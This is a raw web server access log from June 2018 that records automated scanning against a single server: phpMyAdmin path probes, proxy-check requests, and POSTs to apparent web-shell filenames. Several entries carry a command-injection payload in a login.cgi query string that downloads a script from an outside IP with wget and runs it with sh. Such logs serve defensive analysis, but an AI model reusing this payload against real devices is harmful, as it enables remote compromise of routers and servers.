46.27.131.40 - - [17/Jun/2018:13:37:56 +0000] "GET /admin/PMA/index.php HTTP/1.1" 404 178 "-" "Mozilla/5.0"
46.27.131.40 - - [17/Jun/2018:13:37:56 +0000] "GET /admin/mysql/index.php HTTP/1.1" 404 178 "-" "Mozilla/5.0"
46.27.131.40 - - [17/Jun/2018:13:37:56 +0000] "GET /admin/mysql2/index.php HTTP/1.1" 404 178 "-" "Mozilla/5.0"
46.27.131.40 - - [17/Jun/2018:13:37:56 +0000] "GET /admin/phpmyadmin/index.php HTTP/1.1" 404 178 "-" "Mozilla/5.0"
46.27.131.40 - - [17/Jun/2018:13:37:56 +0000] "GET /admin/phpMyAdmin/index.php HTTP/1.1" 404 178 "-" "Mozilla/5.0"
46.27.131.40 - - [17/Jun/2018:13:37:56 +0000] "GET /admin/phpmyadmin2/index.php HTTP/1.1" 404 178 "-" "Mozilla/5.0"
46.27.131.40 - - [17/Jun/2018:13:37:56 +0000] "GET /mysqladmin/index.php HTTP/1.1" 404 178 "-" "Mozilla/5.0"
46.27.131.40 - - [17/Jun/2018:13:37:56 +0000] "GET /mysql-admin/index.php HTTP/1.1" 404 178 "-" "Mozilla/5.0"
46.27.131.40 - - [17/Jun/2018:13:37:56 +0000] "GET /phpadmin/index.php HTTP/1.1" 404 178 "-" "Mozilla/5.0"
46.27.131.40 - - [17/Jun/2018:13:37:56 +0000] "GET /phpmyadmin0/index.php HTTP/1.1" 404 178 "-" "Mozilla/5.0"
46.27.131.40 - - [17/Jun/2018:13:37:56 +0000] "GET /phpmyadmin1/index.php HTTP/1.1" 404 178 "-" "Mozilla/5.0"
46.27.131.40 - - [17/Jun/2018:13:37:56 +0000] "GET /phpmyadmin2/index.php HTTP/1.1" 404 178 "-" "Mozilla/5.0"
46.27.131.40 - - [17/Jun/2018:13:37:56 +0000] "GET /myadmin/index.php HTTP/1.1" 404 178 "-" "Mozilla/5.0"
46.27.131.40 - - [17/Jun/2018:13:37:56 +0000] "GET /myadmin2/index.php HTTP/1.1" 404 178 "-" "Mozilla/5.0"
46.27.131.40 - - [17/Jun/2018:13:37:57 +0000] "GET /xampp/phpmyadmin/index.php HTTP/1.1" 404 178 "-" "Mozilla/5.0"
46.27.131.40 - - [17/Jun/2018:13:37:57 +0000] "GET /phpMyadmin_bak/index.php HTTP/1.1" 404 178 "-" "Mozilla/5.0"
46.27.131.40 - - [17/Jun/2018:13:37:57 +0000] "GET /www/phpMyAdmin/index.php HTTP/1.1" 404 178 "-" "Mozilla/5.0"
46.27.131.40 - - [17/Jun/2018:13:37:57 +0000] "GET /tools/phpMyAdmin/index.php HTTP/1.1" 404 178 "-" "Mozilla/5.0"
46.27.131.40 - - [17/Jun/2018:13:37:57 +0000] "GET /phpmyadmin-old/index.php HTTP/1.1" 404 178 "-" "Mozilla/5.0"
46.27.131.40 - - [17/Jun/2018:13:37:57 +0000] "GET /phpMyAdminold/index.php HTTP/1.1" 404 178 "-" "Mozilla/5.0"
46.27.131.40 - - [17/Jun/2018:13:37:57 +0000] "GET /phpMyAdmin.old/index.php HTTP/1.1" 404 178 "-" "Mozilla/5.0"
46.27.131.40 - - [17/Jun/2018:13:37:57 +0000] "GET /pma-old/index.php HTTP/1.1" 404 178 "-" "Mozilla/5.0"
46.27.131.40 - - [17/Jun/2018:13:37:57 +0000] "GET /claroline/phpMyAdmin/index.php HTTP/1.1" 404 178 "-" "Mozilla/5.0"
46.27.131.40 - - [17/Jun/2018:13:37:57 +0000] "GET /typo3/phpmyadmin/index.php HTTP/1.1" 404 178 "-" "Mozilla/5.0"
46.27.131.40 - - [17/Jun/2018:13:37:57 +0000] "GET /phpma/index.php HTTP/1.1" 404 178 "-" "Mozilla/5.0"
46.27.131.40 - - [17/Jun/2018:13:37:57 +0000] "GET /phpmyadmin/phpmyadmin/index.php HTTP/1.1" 404 178 "-" "Mozilla/5.0"
46.27.131.40 - - [17/Jun/2018:13:37:57 +0000] "GET /phpMyAdmin/phpMyAdmin/index.php HTTP/1.1" 404 178 "-" "Mozilla/5.0"
61.176.222.170 - - [17/Jun/2018:13:43:04 +0000] "GET /ip_js.php?IP=195.201.186.116&DK=80&DD=ASNIAOUFMOMZJIBD HTTP/1.1" 404 580 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.92 Safari/537.1 LBBROWSER"
178.169.82.32 - - [17/Jun/2018:13:54:44 +0000] "GET / HTTP/1.1" 200 7887 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
61.176.222.170 - - [17/Jun/2018:13:55:07 +0000] "GET /ip_js.php?IP=195.201.186.116&DK=80&DD=ASNIAOUFMOMZJIBD HTTP/1.1" 404 580 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.92 Safari/537.1 LBBROWSER"
77.245.162.29 - - [17/Jun/2018:13:56:44 +0000] "GET / HTTP/1.1" 200 7887 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
170.238.113.233 - - [17/Jun/2018:14:04:42 +0000] "GET / HTTP/1.1" 200 7885 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
88.249.58.30 - - [17/Jun/2018:14:05:24 +0000] "HEAD / HTTP/1.0" 200 0 "-" "-"
61.176.222.170 - - [17/Jun/2018:14:09:50 +0000] "GET /ip_js.php?IP=195.201.186.116&DK=80&DD=ASNIAOUFMOMZJIBD HTTP/1.1" 404 580 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.92 Safari/537.1 LBBROWSER"
61.176.222.171 - - [17/Jun/2018:14:22:49 +0000] "GET /ip_js.php?IP=195.201.186.116&DK=80&DD=NSNIAOUFMOMZJIBA HTTP/1.1" 404 580 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.92 Safari/537.1 LBBROWSER"
216.254.187.166 - - [17/Jun/2018:14:32:29 +0000] "GET / HTTP/1.0" 200 7874 "-" "-"
81.30.214.77 - - [17/Jun/2018:14:51:07 +0000] "GET / HTTP/1.0" 200 7874 "-" "-"
141.212.122.81 - - [17/Jun/2018:14:59:30 +0000] "GET /x HTTP/1.1" 400 182 "-" "Telesphoreo"
61.176.222.171 - - [17/Jun/2018:15:01:59 +0000] "GET /ip_js.php?IP=195.201.186.116&DK=80&DD=NSNIAOUFMOMZJIBA HTTP/1.1" 404 580 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.92 Safari/537.1 LBBROWSER"
200.35.58.1 - - [17/Jun/2018:15:09:56 +0000] "GET / HTTP/1.1" 200 7887 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
61.176.222.171 - - [17/Jun/2018:15:15:57 +0000] "GET /ip_js.php?IP=195.201.186.116&DK=80&DD=NSNIAOUFMOMZJIBA HTTP/1.1" 404 580 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.92 Safari/537.1 LBBROWSER"
118.25.48.116 - - [17/Jun/2018:15:16:07 +0000] "GET / HTTP/1.1" 200 2331 "-" "Mozilla/5.0 zgrab/0.x"
123.21.181.213 - - [17/Jun/2018:15:25:49 +0000] "GET / HTTP/1.0" 200 7874 "-" "-"
61.176.222.170 - - [17/Jun/2018:15:25:51 +0000] "GET /ip_js.php?IP=195.201.186.116&DK=80&DD=ASNIAOUFMOMZJIBD HTTP/1.1" 404 580 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.92 Safari/537.1 LBBROWSER"
186.139.33.159 - - [17/Jun/2018:15:34:31 +0000] "GET /login.cgi?cli=aa%20aa%27;wget%20http://185.62.190.191/r%20-O%20-%3E%20/tmp/r;sh%20/tmp/r%27$ HTTP/1.1" 404 152 "-" "Hello, World"
61.176.222.170 - - [17/Jun/2018:15:39:41 +0000] "GET /ip_js.php?IP=195.201.186.116&DK=80&DD=ASNIAOUFMOMZJIBD HTTP/1.1" 404 580 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.92 Safari/537.1 LBBROWSER"
190.29.115.26 - - [17/Jun/2018:15:48:09 +0000] "GET / HTTP/1.0" 200 7874 "-" "-"
61.176.222.170 - - [17/Jun/2018:15:53:28 +0000] "GET http://47.95.231.250:58204/ip_js.php?IP=195.201.186.116&DK=80&DD=ASNIAOUFMOMZJIBD HTTP/1.0" 404 580 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.92 Safari/537.1 LBBROWSER"
61.176.222.170 - - [17/Jun/2018:15:53:29 +0000] "GET http://47.95.231.250:58204/ip_js.php?IP=195.201.186.116&DK=80&DD=ASNIAOUFMOMZJIBD HTTP/1.0" 404 580 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.92 Safari/537.1 LBBROWSER"
47.188.161.246 - - [17/Jun/2018:15:58:19 +0000] "GET / HTTP/1.0" 200 7874 "-" "-"
191.242.40.79 - - [17/Jun/2018:16:05:10 +0000] "GET / HTTP/1.1" 200 7887 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
61.176.222.171 - - [17/Jun/2018:16:07:03 +0000] "GET /ip_js.php?IP=195.201.186.116&DK=80&DD=NSNIAOUFMOMZJIBA HTTP/1.1" 404 580 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.92 Safari/537.1 LBBROWSER"
77.221.213.248 - - [17/Jun/2018:16:16:34 +0000] "GET / HTTP/1.0" 200 7874 "-" "-"
61.176.222.171 - - [17/Jun/2018:16:17:11 +0000] "GET /ip_js.php?IP=195.201.186.116&DK=80&DD=NSNIAOUFMOMZJIBA HTTP/1.1" 404 580 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.92 Safari/537.1 LBBROWSER"
167.62.128.254 - - [17/Jun/2018:16:27:37 +0000] "GET /login.cgi?cli=aa%20aa%27;wget%20http://185.62.190.191/r%20-O%20-%3E%20/tmp/r;sh%20/tmp/r%27$ HTTP/1.1" 404 152 "-" "Hello, World"
61.176.222.171 - - [17/Jun/2018:16:29:38 +0000] "GET /ip_js.php?IP=195.201.186.116&DK=80&DD=NSNIAOUFMOMZJIBA HTTP/1.1" 404 580 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.92 Safari/537.1 LBBROWSER"
61.176.222.171 - - [17/Jun/2018:16:40:12 +0000] "GET /ip_js.php?IP=195.201.186.116&DK=80&DD=NSNIAOUFMOMZJIBA HTTP/1.1" 404 580 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.92 Safari/537.1 LBBROWSER"
177.185.116.31 - - [17/Jun/2018:16:55:02 +0000] "GET /login.cgi?cli=aa%20aa%27;wget%20http://185.62.190.191/r%20-O%20-%3E%20/tmp/r;sh%20/tmp/r%27$ HTTP/1.1" 404 152 "-" "Hello, World"
94.230.132.99 - - [17/Jun/2018:16:56:10 +0000] "GET / HTTP/1.0" 200 7874 "-" "-"
151.76.200.236 - - [17/Jun/2018:17:03:07 +0000] "GET / HTTP/1.0" 200 7874 "-" "-"
61.176.222.170 - - [17/Jun/2018:17:05:49 +0000] "GET /ip_js.php?IP=195.201.186.116&DK=80&DD=ASNIAOUFMOMZJIBD HTTP/1.1" 404 580 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.92 Safari/537.1 LBBROWSER"
61.176.222.170 - - [17/Jun/2018:17:17:14 +0000] "GET /ip_js.php?IP=195.201.186.116&DK=80&DD=ASNIAOUFMOMZJIBD HTTP/1.1" 404 580 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.92 Safari/537.1 LBBROWSER"
61.176.222.171 - - [17/Jun/2018:17:31:49 +0000] "GET /ip_js.php?IP=195.201.186.116&DK=80&DD=NSNIAOUFMOMZJIBA HTTP/1.1" 404 580 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.92 Safari/537.1 LBBROWSER"
213.251.235.126 - - [17/Jun/2018:17:51:22 +0000] "GET / HTTP/1.0" 200 7874 "-" "-"
61.176.222.171 - - [17/Jun/2018:17:55:10 +0000] "GET /ip_js.php?IP=195.201.186.116&DK=80&DD=NSNIAOUFMOMZJIBA HTTP/1.1" 404 580 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.92 Safari/537.1 LBBROWSER"
66.111.41.200 - - [17/Jun/2018:17:56:23 +0000] "GET /phpmyadmin/scripts/db_setup.init.php HTTP/1.0" 404 178 "-" "-"
61.176.222.171 - - [17/Jun/2018:18:07:49 +0000] "GET /ip_js.php?IP=195.201.186.116&DK=80&DD=NSNIAOUFMOMZJIBA HTTP/1.1" 404 580 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.92 Safari/537.1 LBBROWSER"
151.67.62.222 - - [17/Jun/2018:18:13:07 +0000] "GET /login.cgi?cli=aa%20aa%27;wget%20http://185.62.190.191/r%20-O%20-%3E%20/tmp/r;sh%20/tmp/r%27$ HTTP/1.1" 404 152 "-" "Hello, World"
186.138.211.120 - - [17/Jun/2018:18:16:07 +0000] "GET / HTTP/1.0" 200 7874 "-" "-"
61.176.222.171 - - [17/Jun/2018:18:22:50 +0000] "GET /ip_js.php?IP=195.201.186.116&DK=80&DD=NSNIAOUFMOMZJIBA HTTP/1.1" 404 580 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.92 Safari/537.1 LBBROWSER"
60.250.230.119 - - [17/Jun/2018:18:30:41 +0000] "HEAD / HTTP/1.0" 200 0 "-" "-"
61.176.222.171 - - [17/Jun/2018:18:34:21 +0000] "GET /ip_js.php?IP=195.201.186.116&DK=80&DD=NSNIAOUFMOMZJIBA HTTP/1.1" 404 580 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.92 Safari/537.1 LBBROWSER"
5.233.133.11 - - [17/Jun/2018:18:40:08 +0000] "GET / HTTP/1.1" 200 7887 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
220.134.9.248 - - [17/Jun/2018:18:50:00 +0000] "GET / HTTP/1.0" 200 7874 "-" "-"
179.156.143.73 - - [17/Jun/2018:18:58:11 +0000] "GET / HTTP/1.0" 200 7874 "-" "-"
61.176.222.171 - - [17/Jun/2018:19:02:17 +0000] "GET /ip_js.php?IP=195.201.186.116&DK=80&DD=NSNIAOUFMOMZJIBA HTTP/1.1" 404 580 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.92 Safari/537.1 LBBROWSER"
88.249.106.178 - - [17/Jun/2018:19:04:49 +0000] "GET / HTTP/1.0" 200 7874 "-" "-"
61.176.222.170 - - [17/Jun/2018:19:15:32 +0000] "GET /ip_js.php?IP=195.201.186.116&DK=80&DD=ASNIAOUFMOMZJIBD HTTP/1.1" 404 580 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.92 Safari/537.1 LBBROWSER"
61.176.222.171 - - [17/Jun/2018:19:29:52 +0000] "GET /ip_js.php?IP=195.201.186.116&DK=80&DD=NSNIAOUFMOMZJIBA HTTP/1.1" 404 580 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.92 Safari/537.1 LBBROWSER"
178.73.215.171 - - [17/Jun/2018:19:38:19 +0000] "GET / HTTP/1.0" 200 7874 "-" "-"
61.176.222.170 - - [17/Jun/2018:19:42:35 +0000] "GET /ip_js.php?IP=195.201.186.116&DK=80&DD=ASNIAOUFMOMZJIBD HTTP/1.1" 404 580 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.92 Safari/537.1 LBBROWSER"
61.176.222.170 - - [17/Jun/2018:19:56:55 +0000] "GET /ip_js.php?IP=195.201.186.116&DK=80&DD=ASNIAOUFMOMZJIBD HTTP/1.1" 404 580 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.92 Safari/537.1 LBBROWSER"
61.176.222.170 - - [17/Jun/2018:20:10:23 +0000] "GET /ip_js.php?IP=195.201.186.116&DK=80&DD=ASNIAOUFMOMZJIBD HTTP/1.1" 404 580 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.92 Safari/537.1 LBBROWSER"
79.29.12.174 - - [17/Jun/2018:20:13:24 +0000] "GET /login.cgi?cli=aa%20aa%27;wget%20http://185.62.190.191/r%20-O%20-%3E%20/tmp/r;sh%20/tmp/r%27$ HTTP/1.1" 404 152 "-" "Hello, World"
61.176.222.170 - - [17/Jun/2018:20:23:43 +0000] "GET /ip_js.php?IP=195.201.186.116&DK=80&DD=ASNIAOUFMOMZJIBD HTTP/1.1" 404 580 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.92 Safari/537.1 LBBROWSER"
219.92.71.142 - - [17/Jun/2018:20:33:57 +0000] "GET / HTTP/1.0" 200 7874 "-" "-"
61.176.222.171 - - [17/Jun/2018:20:37:46 +0000] "GET /ip_js.php?IP=195.201.186.116&DK=80&DD=NSNIAOUFMOMZJIBA HTTP/1.1" 404 580 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.92 Safari/537.1 LBBROWSER"
61.176.222.170 - - [17/Jun/2018:20:49:20 +0000] "GET /ip_js.php?IP=195.201.186.116&DK=80&DD=ASNIAOUFMOMZJIBD HTTP/1.1" 404 580 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.92 Safari/537.1 LBBROWSER"
61.176.222.171 - - [17/Jun/2018:20:50:11 +0000] "GET /ip_js.php?IP=195.201.186.116&DK=80&DD=NSNIAOUFMOMZJIBA HTTP/1.1" 404 580 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.92 Safari/537.1 LBBROWSER"
190.64.148.10 - - [17/Jun/2018:20:51:48 +0000] "HEAD / HTTP/1.0" 200 0 "-" "-"
218.76.139.10 - - [17/Jun/2018:21:00:19 +0000] "HEAD / HTTP/1.1" 200 0 "-" "-"
89.190.180.187 - - [17/Jun/2018:21:02:05 +0000] "GET /login.cgi?cli=aa%20aa%27;wget%20http://185.62.190.191/r%20-O%20-%3E%20/tmp/r;sh%20/tmp/r%27$ HTTP/1.1" 404 152 "-" "Hello, World"
61.176.222.170 - - [17/Jun/2018:21:04:20 +0000] "GET /ip_js.php?IP=195.201.186.116&DK=80&DD=ASNIAOUFMOMZJIBD HTTP/1.1" 404 580 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.92 Safari/537.1 LBBROWSER"
41.193.130.86 - - [17/Jun/2018:21:05:24 +0000] "GET / HTTP/1.1" 200 7893 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
61.176.222.170 - - [17/Jun/2018:21:15:46 +0000] "GET /ip_js.php?IP=195.201.186.116&DK=80&DD=ASNIAOUFMOMZJIBD HTTP/1.1" 404 580 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.92 Safari/537.1 LBBROWSER"
191.242.8.245 - - [17/Jun/2018:21:17:14 +0000] "HEAD / HTTP/1.0" 499 0 "-" "-"
191.242.8.245 - - [17/Jun/2018:21:17:51 +0000] "HEAD / HTTP/1.0" 499 0 "-" "-"
61.176.222.171 - - [17/Jun/2018:21:31:15 +0000] "GET /ip_js.php?IP=195.201.186.116&DK=80&DD=NSNIAOUFMOMZJIBA HTTP/1.1" 404 580 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.92 Safari/537.1 LBBROWSER"
61.176.222.170 - - [17/Jun/2018:21:41:54 +0000] "GET /ip_js.php?IP=195.201.186.116&DK=80&DD=ASNIAOUFMOMZJIBD HTTP/1.1" 404 580 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.92 Safari/537.1 LBBROWSER"
78.176.235.206 - - [17/Jun/2018:21:47:46 +0000] "HEAD / HTTP/1.0" 200 0 "-" "-"
78.176.235.206 - - [17/Jun/2018:21:47:47 +0000] "HEAD / HTTP/1.0" 200 0 "-" "-"
61.176.222.170 - - [17/Jun/2018:21:54:50 +0000] "GET /ip_js.php?IP=195.201.186.116&DK=80&DD=ASNIAOUFMOMZJIBD HTTP/1.1" 404 580 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.92 Safari/537.1 LBBROWSER"
167.56.174.73 - - [17/Jun/2018:21:56:03 +0000] "HEAD / HTTP/1.0" 200 0 "-" "-"
61.176.222.171 - - [17/Jun/2018:22:07:55 +0000] "GET /ip_js.php?IP=195.201.186.116&DK=80&DD=NSNIAOUFMOMZJIBA HTTP/1.1" 404 580 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.92 Safari/537.1 LBBROWSER"
167.60.40.243 - - [17/Jun/2018:22:15:11 +0000] "GET /login.cgi?cli=aa%20aa%27;wget%20http://185.62.190.191/r%20-O%20-%3E%20/tmp/r;sh%20/tmp/r%27$ HTTP/1.1" 404 152 "-" "Hello, World"
61.176.222.171 - - [17/Jun/2018:22:33:07 +0000] "GET /ip_js.php?IP=195.201.186.116&DK=80&DD=NSNIAOUFMOMZJIBA HTTP/1.1" 404 580 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.92 Safari/537.1 LBBROWSER"
103.225.40.205 - - [17/Jun/2018:22:36:37 +0000] "GET / HTTP/1.1" 200 7893 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
61.176.222.171 - - [17/Jun/2018:22:45:58 +0000] "GET /ip_js.php?IP=195.201.186.116&DK=80&DD=NSNIAOUFMOMZJIBA HTTP/1.1" 404 580 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.92 Safari/537.1 LBBROWSER"
110.77.173.51 - - [17/Jun/2018:22:54:27 +0000] "GET / HTTP/1.1" 200 7887 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
61.176.222.170 - - [17/Jun/2018:22:59:01 +0000] "GET /ip_js.php?IP=195.201.186.116&DK=80&DD=ASNIAOUFMOMZJIBD HTTP/1.1" 404 580 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.92 Safari/537.1 LBBROWSER"
93.115.64.43 - - [17/Jun/2018:23:05:09 +0000] "HEAD / HTTP/1.0" 200 0 "-" "-"
61.176.222.171 - - [17/Jun/2018:23:15:20 +0000] "GET /ip_js.php?IP=195.201.186.116&DK=80&DD=NSNIAOUFMOMZJIBA HTTP/1.1" 404 580 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.92 Safari/537.1 LBBROWSER"
61.176.222.171 - - [17/Jun/2018:23:29:50 +0000] "GET /ip_js.php?IP=195.201.186.116&DK=80&DD=NSNIAOUFMOMZJIBA HTTP/1.1" 404 580 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.92 Safari/537.1 LBBROWSER"
61.176.222.171 - - [17/Jun/2018:23:58:57 +0000] "GET /ip_js.php?IP=195.201.186.116&DK=80&DD=NSNIAOUFMOMZJIBA HTTP/1.1" 404 580 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.92 Safari/537.1 LBBROWSER"
61.176.222.170 - - [18/Jun/2018:00:09:57 +0000] "GET /ip_js.php?IP=195.201.186.116&DK=80&DD=ASNIAOUFMOMZJIBD HTTP/1.1" 404 580 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.92 Safari/537.1 LBBROWSER"
61.102.45.219 - - [18/Jun/2018:00:15:48 +0000] "GET / HTTP/1.0" 200 7874 "-" "-"
171.88.162.141 - - [18/Jun/2018:00:19:32 +0000] "GET /login.cgi?cli=aa%20aa%27;wget%20http://185.62.190.191/r%20-O%20-%3E%20/tmp/r;sh%20/tmp/r%27$ HTTP/1.1" 404 152 "-" "Hello, World"
61.176.222.171 - - [18/Jun/2018:00:35:07 +0000] "GET /ip_js.php?IP=195.201.186.116&DK=80&DD=NSNIAOUFMOMZJIBA HTTP/1.1" 404 580 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.92 Safari/537.1 LBBROWSER"
208.81.170.134 - - [18/Jun/2018:00:51:38 +0000] "GET / HTTP/1.0" 200 7874 "-" "-"
61.176.222.171 - - [18/Jun/2018:01:02:53 +0000] "GET /ip_js.php?IP=195.201.186.116&DK=80&DD=NSNIAOUFMOMZJIBA HTTP/1.1" 404 580 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.92 Safari/537.1 LBBROWSER"
61.176.222.170 - - [18/Jun/2018:01:16:26 +0000] "GET /ip_js.php?IP=195.201.186.116&DK=80&DD=ASNIAOUFMOMZJIBD HTTP/1.1" 404 580 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.92 Safari/537.1 LBBROWSER"
61.176.222.171 - - [18/Jun/2018:01:26:46 +0000] "GET /ip_js.php?IP=195.201.186.116&DK=80&DD=NSNIAOUFMOMZJIBA HTTP/1.1" 404 580 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.92 Safari/537.1 LBBROWSER"
85.75.78.205 - - [18/Jun/2018:01:27:13 +0000] "GET /login.cgi?cli=aa%20aa%27;wget%20http://185.62.190.191/r%20-O%20-%3E%20/tmp/r;sh%20/tmp/r%27$ HTTP/1.1" 404 152 "-" "Hello, World"
196.41.50.222 - - [18/Jun/2018:01:29:17 +0000] "HEAD / HTTP/1.0" 499 0 "-" "-"
24.138.226.179 - - [18/Jun/2018:01:30:37 +0000] "GET /login.cgi?cli=aa%20aa%27;wget%20http://185.62.190.191/r%20-O%20-%3E%20/tmp/r;sh%20/tmp/r%27$ HTTP/1.1" 404 152 "-" "Hello, World"
61.176.222.170 - - [18/Jun/2018:01:39:50 +0000] "GET /ip_js.php?IP=195.201.186.116&DK=80&DD=ASNIAOUFMOMZJIBD HTTP/1.1" 404 580 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.92 Safari/537.1 LBBROWSER"
103.238.224.97 - - [18/Jun/2018:01:49:22 +0000] "PROPFIND / HTTP/1.1" 405 182 "-" "-"
103.238.224.97 - - [18/Jun/2018:01:49:23 +0000] "POST /wuwu11.php HTTP/1.1" 404 178 "-" "Mozilla/5.0"
103.238.224.97 - - [18/Jun/2018:01:49:24 +0000] "POST /xw.php HTTP/1.1" 404 178 "-" "Mozilla/5.0"
103.238.224.97 - - [18/Jun/2018:01:49:29 +0000] "POST /xx.php HTTP/1.1" 404 178 "-" "Mozilla/5.0"
103.238.224.97 - - [18/Jun/2018:01:49:40 +0000] "POST /s.php HTTP/1.1" 404 178 "-" "Mozilla/5.0"
103.238.224.97 - - [18/Jun/2018:01:49:44 +0000] "POST /w.php HTTP/1.1" 404 178 "-" "Mozilla/5.0"
